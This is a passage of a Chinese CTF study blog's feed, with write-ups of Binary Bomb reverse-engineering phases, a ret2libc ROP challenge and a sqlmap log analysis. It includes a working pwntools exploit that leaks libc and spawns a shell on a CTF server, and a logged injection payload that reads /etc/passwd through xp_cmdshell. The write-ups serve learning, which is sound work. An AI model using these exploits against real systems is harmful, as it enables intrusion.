class="symbol">.text:</span>08048CA0 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048CA0</span><br><span class="line"><span class="symbol">.text:</span>08048CA0 loc_8048CA0:                            <span class="comment">; CODE XREF: phase_3+36↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048CA0                 <span class="keyword">call</span>    explode_bomb    <span class="comment">; jumptable 08048C3E default case</span></span><br><span class="line"><span class="symbol">.text:</span>08048CA5                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br></pre></td></tr></table></figure><p>首先判断第一个变量是否小于等于7，若不小于7则爆炸。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_14]</span><br><span class="line"><span class="keyword">jmp</span>     <span class="built_in">ds</span>:off_804A180[<span class="built_in">eax</span>*<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>这两句语句是实现switch跳转的关键：先将第一个参数读入eax，然后在<code>0x804A180</code>处根据eax的值查询switch的jump table：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rodata:</span>0804A180 off_804A180  <span class="built_in">dd</span> offset loc_8048C4C   <span class="comment">; DATA XREF: phase_3+3C↑r</span></span><br><span class="line"><span class="symbol">.rodata:</span>0804A180                     <span class="built_in">dd</span> offset loc_8048C45   <span class="comment">; jump table for switch statement</span></span><br><span class="line"><span class="symbol">.rodata:</span>0804A180                     <span class="built_in">dd</span> offset loc_8048C58</span><br><span class="line"><span class="symbol">.rodata:</span>0804A180                     <span class="built_in">dd</span> offset loc_8048C64</span><br><span class="line"><span class="symbol">.rodata:</span>0804A180                     <span class="built_in">dd</span> offset loc_8048C70</span><br><span class="line"><span class="symbol">.rodata:</span>0804A180                     <span class="built_in">dd</span> offset loc_8048C7C</span><br><span class="line"><span class="symbol">.rodata:</span>0804A180                     <span class="built_in">dd</span> offset loc_8048C88</span><br><span class="line"><span class="symbol">.rodata:</span>0804A180                     <span class="built_in">dd</span> offset loc_8048C94</span><br></pre></td></tr></table></figure><p>以输入的第一个字符为0为例，eax经过了+455，-356，+692，-389，+389，-389，+389，-389一系列的操作之后得到结果402。</p><h2 id="验证变量"><a href="#验证变量" class="headerlink" title="验证变量"></a>验证变量</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>08048CAA</span><br><span class="line"><span class="symbol">.text:</span>08048CAA loc_8048CAA:                            <span class="comment">; CODE XREF: phase_3+9C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048CAA                 <span class="keyword">cmp</span>     [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_14], <span class="number">5</span></span><br><span class="line"><span class="symbol">.text:</span>08048CAF                 <span class="keyword">jg</span>      short loc_8048CB7</span><br><span class="line"><span class="symbol">.text:</span>08048CB1                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">2Ch</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span>08048CB5                 <span class="keyword">jz</span>      short loc_8048CBC</span><br><span class="line"><span class="symbol">.text:</span>08048CB7</span><br><span class="line"><span class="symbol">.text:</span>08048CB7 loc_8048CB7:                            <span class="comment">; CODE XREF: phase_3+AD↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048CB7                 <span class="keyword">call</span>    explode_bomb</span><br><span class="line"><span class="symbol">.text:</span>08048CBC <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>08048CBC</span><br><span class="line"><span class="symbol">.text:</span>08048CBC loc_8048CBC:                            <span class="comment">; CODE XREF: phase_3+B3↑j</span></span><br><span class="line"><span class="symbol">.text:</span>08048CBC                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">2Ch</span></span><br><span class="line"><span class="symbol">.text:</span>08048CBF                 <span class="keyword">nop</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC0                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC0 <span class="comment">; &#125; // starts at 8048C02</span></span><br><span class="line"><span class="symbol">.text:</span>08048CC0 phase_3         endp</span><br></pre></td></tr></table></figure><p>将输入的第一个数字与5比较，若小于等于5则不引爆炸弹继续向下，之后将eax中的值（即计算后的结果，402）与第二个参数比较，若相等则可以正常返回。<br>总结，本关的第一个数字共有<strong>5种</strong>可能的值，分别是<strong>0,1,2,3,4,5</strong>，然后可以根据switch的条件分支找到对应的第二个数字的值。</p><h2 id="验证判断"><a href="#验证判断" class="headerlink" title="验证判断"></a>验证判断</h2><center><img src="https://s1.ax1x.com/2020/03/22/8oMBz8.jpg" alt="8oMBz8.jpg" border="0"></center>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binary Bomb Phase3 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Binary Bomb Phase2</title>
    <link href="https://purewhitywhite.github.io/2020-03-21/Binary-Bomb-Phase2/"/>
    <id>https://purewhitywhite.github.io/2020-03-21/Binary-Bomb-Phase2/</id>
    <published>2020-03-21T14:17:24.000Z</published>
    <updated>2020-03-21T15:42:42.985Z</updated>
    
    <content type="html"><![CDATA[<p>Binary Bomb Phase2 writeup.</p><a id="more"></a><h1 id="Binary-Bomb-Phase2"><a href="#Binary-Bomb-Phase2" class="headerlink" title="Binary Bomb Phase2"></a>Binary Bomb Phase2</h1><h2 id="获取数据部分"><a href="#获取数据部分" class="headerlink" title="获取数据部分"></a>获取数据部分</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">phase_2</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+1Ch] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+30h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  read_six_numbers(a1, (<span class="keyword">int</span>)&amp;v3);</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  v2 = &amp;v4;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">2</span> * *((_DWORD *)v2 - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v2 != result )</span><br><span class="line">      explode_bomb();</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != &amp;v5 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_six_numbers():</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">read_six_numbers</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = __isoc99_sscanf(a1, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_804A2E3, a2, a2 + <span class="number">4</span>, a2 + <span class="number">8</span>, a2 + <span class="number">12</span>, a2 + <span class="number">16</span>, a2 + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">5</span> )</span><br><span class="line">    explode_bomb();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一大堆莫名其妙的变量，能理解的部分是read_six_numbers的处理，其中关键在于<a href="https://www.runoob.com/cprogramming/c-function-sscanf.html" target="_blank" rel="noopener">sscanf()</a>的理解。先看看该函数的定义：<br><center><img src="https://s1.ax1x.com/2020/03/21/8hHJs0.jpg" alt="8hHJs0.jpg" border="0"></center><br><center><img src="https://s1.ax1x.com/2020/03/21/8hHRoD.jpg" alt="8hHRoD.jpg" border="0"></center><br><center><img src="https://s1.ax1x.com/2020/03/21/8hbpyq.jpg" alt="8hbpyq.jpg" border="0"></center></p><p>了解到<code>a1</code>即为将被处理的字符串，该字符串将被按照<code>unk_804A2E3</code>处存储的规则处理，结果放在<code>v3</code>所对应的位置上，返回值为成功匹配到的数字个数。看一下<code>unk_804A2E3</code>处对于输入字符串的处理规则：<br><center><img src="https://s1.ax1x.com/2020/03/21/8hbw0f.jpg" alt="8hbw0f.jpg" border="0"></center></p><p>%d %d %d %d %d %d，说明我们要输入的是6个数字，就和函数名对应起来了。<br>接下来<code>if ( v3 != 1 )</code>判断输入的第一个数字是否为1，若不是则会爆炸。<br>之后过程IDA解释得不甚合理，转向查看汇编指令。</p><h2 id="循环判断部分"><a href="#循环判断部分" class="headerlink" title="循环判断部分"></a>循环判断部分</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x08048bd9</span> &lt;+<span class="number">37</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x8048bf2</span> &lt;phase_2+<span class="number">62</span>&gt;</span><br><span class="line"><span class="number">0x08048bdb</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebx</span>-<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x08048bde</span> &lt;+<span class="number">42</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x08048be0</span> &lt;+<span class="number">44</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebx</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x08048be2</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">je</span>     <span class="number">0x8048be9</span> &lt;phase_2+<span class="number">53</span>&gt;</span><br><span class="line"><span class="number">0x08048be4</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">call</span>   <span class="number">0x80490f5</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x08048be9</span> &lt;+<span class="number">53</span>&gt;:<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x08048bec</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ebx</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0x08048bee</span> &lt;+<span class="number">58</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x8048bdb</span> &lt;phase_2+<span class="number">39</span>&gt;</span><br><span class="line"><span class="number">0x08048bf0</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x8048bfc</span> &lt;phase_2+<span class="number">72</span>&gt;</span><br><span class="line"><span class="number">0x08048bf2</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">ebx</span>,[<span class="built_in">esp</span>+<span class="number">0x1c</span>]</span><br><span class="line"><span class="number">0x08048bf6</span> &lt;+<span class="number">66</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">esi</span>,[<span class="built_in">esp</span>+<span class="number">0x30</span>]</span><br><span class="line"><span class="number">0x08048bfa</span> &lt;+<span class="number">70</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x8048bdb</span> &lt;phase_2+<span class="number">39</span>&gt;</span><br><span class="line"><span class="number">0x08048bfc</span> &lt;+<span class="number">72</span>&gt;:<span class="keyword">add</span>    <span class="built_in">esp</span>,<span class="number">0x34</span></span><br><span class="line"><span class="number">0x08048bff</span> &lt;+<span class="number">75</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">ebx</span></span><br><span class="line"><span class="number">0x08048c00</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">esi</span></span><br><span class="line"><span class="number">0x08048c01</span> &lt;+<span class="number">77</span>&gt;:<span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>大致思想是这样的：<code>ebx</code>作为遍历数组的指针，每指到一个数将其存入<code>eax</code>，并将<code>eax</code>*2的结果与下一个数相比较，若相等则再指向下一个数；若不相等即引爆炸弹。判断后，<code>ebx</code>与存储着数组边界的<code>esi</code>进行比较，如果不相等，即继续循环；若相等（且过程中没有call炸弹爆炸）则正常ret。<br>根据以上的分析可知，<code>ssanf</code>读到的数组应该是初值为1，倍数为2，个数为6个的等比数列，即[1,2,4,8,16,32]。<br>使用<code>gdb info regis</code>查看寄存器的值验证判断：<br>第一次循环，eax=1<br><center><img src="https://s1.ax1x.com/2020/03/21/8hx5rj.jpg" alt="8hx5rj.jpg" border="0"></center></p><p><code>add eax,eax</code><br><center><img src="https://s1.ax1x.com/2020/03/21/8hz9d1.jpg" alt="8hz9d1.jpg" border="0"></center></p><p><code>add ebx,0x4</code><br><center><img src="https://s1.ax1x.com/2020/03/21/8hzkRO.jpg" alt="8hzkRO.jpg" border="0"></center></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binary Bomb Phase2 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Binary Bomb Phase1</title>
    <link href="https://purewhitywhite.github.io/2020-03-20/Binary-Bomb-Phase1/"/>
    <id>https://purewhitywhite.github.io/2020-03-20/Binary-Bomb-Phase1/</id>
    <published>2020-03-20T14:27:04.000Z</published>
    <updated>2020-03-20T15:35:16.591Z</updated>
    
    <content type="html"><![CDATA[<p>Binary Bomb Phase1 writeup.</p><a id="more"></a><blockquote><p>大概了解了一下，这应该是类似于逆向的题目吧，解题的关键在于找到密码生成的方法，或者修改汇编程序绕过密码验证。</p></blockquote><p>使用<code>gdb *filename*</code>启动gdb后使用<code>gdb l</code>查看源代码：<br><center><img src="https://s1.ax1x.com/2020/03/20/82IcHs.jpg" alt="82IcHs.jpg" border="0"></center></p><p>可见<code>phase_1</code>就是阶段一的入口点，在此设置断点：<code>gdb b phase_1</code>后运行程序<code>gdb r</code>：<center><img src="https://s1.ax1x.com/2020/03/20/82oV8f.jpg" alt="82oV8f.jpg" border="0"></center></p><p>输入一些内容后按回车键回到gdb，查看汇编代码<code>gdb disassemb</code>：<center><img src="https://s1.ax1x.com/2020/03/20/82o6xO.jpg" alt="82o6xO.jpg" border="0"></center></p><p>这段汇编代码的大致含义：开辟栈空间，将<code>0x804a124</code>处的数据移入[esp+4]的位置，将<code>esp+20</code>处的数据（应该是输入的字符串作为参数）移到eax中，将eax中的值放入栈顶，请求strings_not_equal函数，根据返回值（eax）的值是否为0，从而决定是否引爆炸弹。<br>查看<code>0x804a124</code>处的数据(s:以字符串形式输出)：<code>gdb x/s 0x804a124</code><br><center><img src="https://s1.ax1x.com/2020/03/20/82Oiy6.jpg" alt="82Oiy6.jpg" border="0"><center></center></center></p><p>于是知道了破解phase1的密码<code>I am the mayor. I can do anything I want.</code>，测试：<br><center><img src="https://s1.ax1x.com/2020/03/20/82OlOf.jpg" alt="82OlOf.jpg" border="0"></center></p><ul><li>AT&amp;T太辣眼睛？：<code>set disassembly-flavor intel</code><center><img src="https://s1.ax1x.com/2020/03/20/82XjPJ.jpg" alt="82XjPJ.jpg" border="0"></center></li></ul><p><a href="https://www.cnblogs.com/hdk1993/p/4820353.html" target="_blank" rel="noopener">AT&amp;T和Inter区别</a></p><ul><li><a href="http://c.biancheng.net/view/3567.html" target="_blank" rel="noopener">跳转指令集合</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Binary Bomb Phase1 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day11 pwn&amp;Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-18/Stage1Day11-pwn-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-18/Stage1Day11-pwn-Misc/</id>
    <published>2020-03-18T12:19:18.000Z</published>
    <updated>2020-03-18T15:32:09.840Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>ROP、birthday writeup.</p><a id="more"></a><h1 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP(Return Oriented Programming)"></a>ROP(Return Oriented Programming)</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。<br>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件:</p><ul><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。<br>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。<br><a href https: ctf-wiki.github.io ctf-wiki pwn linux stackoverflow basic-rop-zh"">reference</a><h2 id="查看文件-amp-保护机制-amp-system-amp-bin-sh"><a href="#查看文件-amp-保护机制-amp-system-amp-bin-sh" class="headerlink" title="查看文件&amp;保护机制&amp;system&amp;/bin/sh"></a>查看文件&amp;保护机制&amp;system&amp;/bin/sh</h2><center><img src="https://s1.ax1x.com/2020/03/18/8DipUH.jpg" alt="8DipUH.jpg" border="0"></center></li></ul><p><em>动态链接</em>的32位ELF文件，开启了<code>NX</code>保护，不能执行栈中的shellcode了。<br><center><a href="https://imgchr.com/i/8DVn9H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/03/18/8DVn9H.jpg" alt="8DVn9H.jpg" border="0"></a></center><br>找不到system和/bin/sh，尝试在其动态链接库中查找。</p><h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到buf的大小为58h，读入C8h字节数据，存在栈溢出。由于system函数的地址位置，同时属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。所以如果我们知道 libc中某个函数的地址，那么我们就可以确定该程序利用的 libc版本。进而我们就可以知道 system 函数的地址。由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。注意到在read函数之前执行过puts()，所以我们就通过泄露puts()的地址获得libc的版本。<a href https: ctf-wiki.github.io ctf-wiki pwn linux stackoverflow basic-rop-zh"">reference</a></p><h2 id="获得puts地址"><a href="#获得puts地址" class="headerlink" title="获得puts地址"></a>获得puts地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>, <span class="number">9991</span>)</span><br><span class="line">pwn2 = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">puts_plt = pwn2.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = pwn2.got[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment"># entry = pwn2.symbols['sub_80484EA']</span></span><br><span class="line">entry = <span class="number">0x08048519</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(entry) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br></pre></td></tr></table></figure><blockquote><p><em>问题：第三行为什么要获取main的地址？而不是调用puts()的sub_80484EA()的地址？这个payload的原理到底是什么？</em><br><center><img src="https://s1.ax1x.com/2020/03/18/8Dy9G8.jpg" alt="8Dy9G8.jpg" border="0"></center></p></blockquote><h2 id="由puts的地址推导出system和-bin-sh的地址"><a href="#由puts的地址推导出system和-bin-sh的地址" class="headerlink" title="由puts的地址推导出system和/bin/sh的地址"></a>由puts的地址推导出system和/bin/sh的地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># libc = LibcSearcher('puts', puts_addr)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">libcbase = puts_addr - libc.dump('puts')</span></span><br><span class="line"><span class="string">system_addr = libcbase + libc.dump('system')</span></span><br><span class="line"><span class="string">binsh_addr = libcbase + libc.dump('str_bin_sh')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">putslibc = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">libcbase = puts_addr - putslibc</span><br><span class="line">syslibc=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = libcbase + syslibc</span><br><span class="line">binsh_addr = libcbase + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br></pre></td></tr></table></figure><blockquote><ul><li>使用<code>LibcSearcher</code>显示<code>No matched libc, please add more libc or try others</code>怎么办？<br>使用<code>ldd filename</code>查看ELF文件依赖的动态库，然后手动添加即可<center><img src="https://s1.ax1x.com/2020/03/18/8D6V6e.jpg" alt="8D6V6e.jpg" border="0"></center></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># getshell</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><center><img src="https://s1.ax1x.com/2020/03/18/8D6dkq.jpg" alt="8D6dkq.jpg" border="0"></center><blockquote><p>对于rec2libc的原理掌握得还很不到位，本文将继续更新</p></blockquote><h1 id="Birthday"><a href="#Birthday" class="headerlink" title="Birthday"></a>Birthday</h1><p>使用<code>Advanced Zip Password Recovery</code>打开，选择暴力破解模式，设置密码形式为全数字all-digit，起始值为19900101，点击start即可破解得到密码。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;ROP、birthday writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
      <category term="pwn" scheme="https://purewhitywhite.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day10 Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-17/Stage1Day10-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-17/Stage1Day10-Misc/</id>
    <published>2020-03-17T15:05:09.000Z</published>
    <updated>2020-03-17T15:35:39.310Z</updated>
    
    <content type="html"><![CDATA[<p>Log writeup.</p><a id="more"></a><h2 id="URL解码"><a href="#URL解码" class="headerlink" title="URL解码"></a>URL解码</h2><p>打开access.log文件可以看到这是一份被sqlmap扫描过的主机的日志文件，先url解码提高可读性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">log = open(<span class="string">'access.log'</span>, <span class="string">'r'</span>)</span><br><span class="line">f = open(<span class="string">'output.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> log.readlines():</span><br><span class="line">    f.write(parse.unquote(i))</span><br></pre></td></tr></table></figure><p>观察解码后的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:17 +0000] &quot;GET /?username=admin&amp;password=b HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:17 +0000] &quot;GET /?username=admin&amp;password=b&amp;wcDa=2205 AND 1=1 UNION ALL SELECT 1,NULL,&apos;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&apos;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(&apos;cat ../../../etc/passwd&apos;)# HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:18 +0000] &quot;GET /?username=admin&amp;password=b HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:18 +0000] &quot;GET /?username=2754&amp;password=b HTTP/1.1&quot; 200 183 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">192.168.247.129 - - [24/Dec/2017:08:21:18 +0000] &quot;GET /?username=admin&apos;,.((&quot;.),.&amp;password=b HTTP/1.1&quot; 200 182 &quot;http://192.168.247.130:8899/&quot; &quot;sqlmap/1.1.12#stable (http://sqlmap.org)&quot;</span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h2 id="日志分析"><a href="#日志分析" class="headerlink" 